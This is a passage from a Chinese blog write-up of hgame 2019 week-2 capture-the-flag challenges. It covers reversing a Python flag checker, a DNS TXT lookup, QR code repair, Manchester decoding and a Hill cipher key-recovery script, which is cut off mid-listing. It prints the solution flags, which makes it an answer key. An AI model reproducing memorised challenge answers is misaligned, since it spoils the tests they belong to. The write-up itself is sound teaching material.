class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Welcome to Processor's Python Classroom Part 2!\n"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Now let's start the origin of Python!\n"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Plz Input Your Flag:\n'</span></span><br><span class="line">enc = raw_input()</span><br><span class="line">len = len(enc)</span><br><span class="line">enc1 = []</span><br><span class="line">enc2 = <span class="string">''</span></span><br><span class="line">aaa = <span class="string">'ioOavquaDb&#125;x2ha4[~ifqZaujQ#'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        enc1.append(chr(ord(enc[i]) + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    enc1.append(chr(ord(enc[i]) + <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">s1 = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len):</span><br><span class="line">        <span class="keyword">if</span> (i + x) % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            s1.append(enc1[i])</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">enc2 = enc2.join(s1)</span><br><span class="line"><span class="keyword">if</span> enc2 <span class="keyword">in</span> aaa:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"You're Right!"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"You're Wrong!"</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>可以看到flag输入后，存在<code>enc</code>中，然后经过了两步操作：</p><p>第一步：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        enc1.append(chr(ord(enc[i]) + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    enc1.append(chr(ord(enc[i]) + <span class="number">2</span>))</span><br></pre></td></tr></table></figure><p>这个就是将第一个字符<code>+1</code>，第二个字符<code>+2</code>，依次类推。然后存入<code>enc1</code></p><hr /><p>第二步：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len):</span><br><span class="line">        <span class="keyword">if</span> (i + x) % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            s1.append(enc1[i])</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>这个其实就是栅栏密码的加密方式，但其实是反着的，按照0，2，1依次取。</p><p>然后得到<code>enc2</code>，然后<code>enc2</code>应该就是等于<code>aaa</code>.</p><p>所以逆向程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">aaa = <span class="string">'ioOavquaDb&#125;x2ha4[~ifqZaujQ#'</span></span><br><span class="line">enc2 = aaa</span><br><span class="line"></span><br><span class="line">enc1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line">    enc1.append(aaa[int(i / <span class="number">3</span>) + (<span class="number">27</span> - <span class="number">9</span> * (i % <span class="number">3</span>)) % <span class="number">27</span>])</span><br><span class="line">enc1 = <span class="string">''</span>.join(enc1)</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line">    flag.append(chr(ord(enc1[i]) - i % <span class="number">2</span> - <span class="number">1</span>))</span><br><span class="line">flag = <span class="string">''</span>.join(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>所以flag最后得输出是<code>hgame{Now_Y0u_got_th3_PYC!}</code></p><h2 id="iii-pwn"><a class="markdownIt-Anchor" href="#iii-pwn"></a> Ⅲ PWN</h2><h2 id="iv-misc"><a class="markdownIt-Anchor" href="#iv-misc"></a> Ⅳ MISC</h2><h3 id="1-are-you-familiar-with-dns-records"><a class="markdownIt-Anchor" href="#1-are-you-familiar-with-dns-records"></a> 1. Are You Familiar with DNS Records?</h3><h4 id="question-4"><a class="markdownIt-Anchor" href="#question-4"></a> Question</h4><p>Description</p><p>well, you know, this is a song-fen-ti, have fun! XD</p><p>URL</p><p><a href="http://project-a11.club/" target="_blank" rel="noopener">http://project-a11.club/</a></p><p>Base Score</p><p>50</p><h4 id="answer-4"><a class="markdownIt-Anchor" href="#answer-4"></a> Answer</h4><p>（其实这个我早就想到了是TXT，但是莫名奇妙弄了好久</p><p>cmd里运行<code>nslookup -qt=TXT project-a11.club 8.8.8.8</code></p><p><img src="/images/hgame-week2/nslookup.png" alt="nslookup" /></p><p>所以flag就是<code>hgame{seems_like_you_are_familiar_with_dns}</code></p><h3 id="4初识二维码"><a class="markdownIt-Anchor" href="#4初识二维码"></a> 4.初识二维码</h3><h4 id="question-5"><a class="markdownIt-Anchor" href="#question-5"></a> Question</h4><p>Description</p><p>你知道吗，二维码就算有缺损也能扫出来哦</p><p>URL</p><p><a href="http://plqfgjy5a.bkt.clouddn.com/%E5%88%9D%E8%AF%86%E4%BA%8C%E7%BB%B4%E7%A0%81.zip" target="_blank" rel="noopener">http://plqfgjy5a.bkt.clouddn.com/初识二维码.zip</a></p><p>Base Score</p><p>150</p><h4 id="answer-5"><a class="markdownIt-Anchor" href="#answer-5"></a> Answer</h4><p>打开压缩包，看到一个flag.txt,里面开头是</p><blockquote><p>data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8CAYAAACrHtS</p></blockquote><p>然后我就搜了一下，找到一个在线网站，转成了图片。</p><p><img src="/images/hgame-week2/flag.png" alt="flag" /></p><p>肯定是个二维码，但是是一个二维码的右下角，也就是说肯定是扫不出来的。</p><p>尝试了了解二维码的原理，而打算手算的时候。。。</p><p>我去网上随便找了个一样尺寸的二维码，然后盖上去，然后改下掩码，然后就扫出来了</p><p>没错。。。就是这样。。。</p><p>扫出来的flag是<code>hgame{Qu1ck_ReSp0nse_cODe}</code></p><h2 id="v-crypto"><a class="markdownIt-Anchor" href="#v-crypto"></a> Ⅴ CRYPTO</h2><h3 id="1-浪漫的足球圣地"><a class="markdownIt-Anchor" href="#1-浪漫的足球圣地"></a> 1. 浪漫的足球圣地</h3><h4 id="question-6"><a class="markdownIt-Anchor" href="#question-6"></a> Question</h4><p>Description</p><p>无</p><p>URL</p><p><a href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/enc.txt" target="_blank" rel="noopener">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/enc.txt</a></p><p>Base Score</p><p>150</p><h4 id="answer-6"><a class="markdownIt-Anchor" href="#answer-6"></a> Answer</h4><p>首先百度（第一次感觉有点被Google坑了）搜浪漫的足球圣地，发现了曼彻斯特，然后发现了曼彻斯特编码。</p><p>这个编码就是用01表示0，10表示1</p><p>网页给的原文是</p><blockquote><p>966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559</p></blockquote><p>可以发现01和10的任意组合最后变成16进制，都会是569A中的一个。</p><p>原文先翻译成二进制,再进行曼彻斯特编码的解码，得到</p><blockquote><p>011010000110011101100001011011010110010101111011001100110110011000110010001101000110010100110101001101100011011100110101001110010011000101100101001110010110001101100010011000010110001000110010011000010011011101100100001100100110011000110001011001100011011100110100001110000110000100110001011001000011010001111101</p></blockquote><p>然后8个一组，按照ASCII，得到flag:<code>hgame{3f24e567591e9cbab2a7d2f1f748a1d4}</code></p><h4 id="2-hill"><a class="markdownIt-Anchor" href="#2-hill"></a> 2. hill</h4><h4 id="question-7"><a class="markdownIt-Anchor" href="#question-7"></a> Question</h4><p>Description</p><p>hill密码，秘钥是3x3矩阵，flag的密文是TCSHXZTCXAPBDKJVJDOHJEAE，flag中含有BABYSHILL，flag是有意义的英文，最终提交格式: hgame{有意义的英文}</p><p>URL</p><p><a href="http://www.example.com/" target="_blank" rel="noopener">http://www.example.com</a></p><p>Base Score</p><p>180</p><h4 id="answer-7"><a class="markdownIt-Anchor" href="#answer-7"></a> Answer</h4><p>参考<a href="https://wenku.baidu.com/view/7b3963bdaeaad1f347933f38.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/7b3963bdaeaad1f347933f38.html</a></p><p>对于秘钥是3x3矩阵的，需要找到明文与密文相对应的9个字符。</p><p>但是这个并不知道对应的，所以只能遍历一遍。<br />分别按照A=0,B=1,…,Z=25的规律，把字母编成数字。然后按照</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>9</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[\begin{matrix}1 &amp; 4 &amp; 7 \\2 &amp; 5 &amp; 8 \\3 &amp; 6 &amp; 9\end{matrix}\right] </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">9</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>的顺序排下来，变成3x3的矩阵。</p><p>然后设明文矩阵为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi></mrow><annotation encoding="application/x-tex">C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>,密文矩阵为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>，然后所以设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mi>A</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">P=AC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span></span></span></span>,那么<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mo>=</mo><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mi>P</mi><mo separator="true">,</mo><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mi>C</mi><msup><mi>P</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">C=A^{-1}P,A^{-1}=CP^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>.</p><p>所以只需要求出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">A^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>，因为这里是Mod26的矩阵，所以要通过初等行变换来算。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msup><mi>P</mi><mi>T</mi></msup><mi mathvariant="normal">∣</mi><msup><mi>C</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mo>&gt;</mo><mo stretchy="false">(</mo><mi>I</mi><mi mathvariant="normal">∣</mi><msup><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mi>T</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(P^T|C^T)=&gt;(I|{A^{-1}}^{T})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2953389999999998em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord">∣</span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0453389999999998em;"><span style="top:-3.267008em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>然后得到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">A^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>，再对全部的密文<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>P</mi><mrow><mi>A</mi><mi>l</mi><mi>l</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{All}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><msub><mi>P</mi><mrow><mi>A</mi><mi>l</mi><mi>l</mi></mrow></msub></mrow><annotation encoding="application/x-tex">A^{-1}P_{All}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,输出即可。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Matrix</span>:</span></span><br><span class="line">    mod = <span class="number">26</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, lists, withs)</span>:</span></span><br><span class="line">        self.lists = lists[:]</span><br><span class="line">        self.withs = withs[:]</span><br><span class="line">        self.size = len(lists)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> it <span class="keyword">in</span> range(self.size):</span><br><span class="line">            self.times(it, self.getTimes(self.lists[it][it]))</span><br><span class="line">            <span class="keyword">for</span> itt <span class="keyword">in</span> range(self.size):</span><br><span class="line">                <span class="keyword">if</span> itt != it:</span><br><span class="line">                    self.addTo(it, -self.lists[itt][it], itt)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">times</span><span class="params">(self, lines, times)</span>:</span></span><br><span class="line">        self.lists[lines] = [i * times <span class="keyword">for</span> i <span class="keyword">in</span> self.lists[lines]]</span><br><span class="line">        self.withs[lines] = [i * times <span class="keyword">for</span> i <span class="keyword">in</span> self.withs[lines]]</span><br><span class="line">        self.modAll()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTo</span><span class="params">(self, fromm, times, to)</span>:</span></span><br><span class="line">        self.lists[to] = [self.lists[to][i] + self.lists[fromm][i] * times <span class="keyword">for</span> i <span class="keyword">in</span> range(self.size)]</span><br><span class="line">        self.withs[to] = [self.withs[to][i] + self.withs[fromm][i] * times <span class="keyword">for</span> i <span class="keyword">in</span> range(self.size)]</span><br><span class="line">        self.modAll()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">modAll</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.lists = [[i % <span class="number">26</span> <span class="keyword">for</span> i <span class="keyword">in</span> line] <span class="keyword">for</span> line <span class="keyword">in</span> self.lists]</span><br><span class="line">        self.withs = [[i % <span class="number">26</span> <span class="keyword">for</span> i <span class="keyword">in</span> line] <span class="keyword">for</span> line <span class="keyword">in</span> self.withs]</span><br><span class="line">        <span class="comment"># print(self.lists)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getTimes</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        times = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (num * times) % self.mod != <span class="number">1</span>:</span><br><span class="line">            times += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> times &gt; <span class="number">100</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> times</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># secret_code = 'TCSHXZTCXAPBDKJVJDOHJEAE'</span></span><br><span class="line"><span class="comment"># text_code = 'BABYSHILL'</span></span><br><span class="line">P = [[<span class="number">19</span>, <span class="number">2</span>, <span class="number">18</span>],</span><br><span class="line">     [<span class="number">7</span>, <span class="number">23</span>, <span class="number">25</span>],</span><br><span class="line">     [<span class="number">19</span>, <span class="number">2</span>, <span class="number">23</span>],</span><br><span class="line">     [<span class="number">0</span>, <span class="number">15</span>, <span class="number">1</span>],</span><br><span class="line">     [<span class="number">3</span>, <span class="number">10</span>, 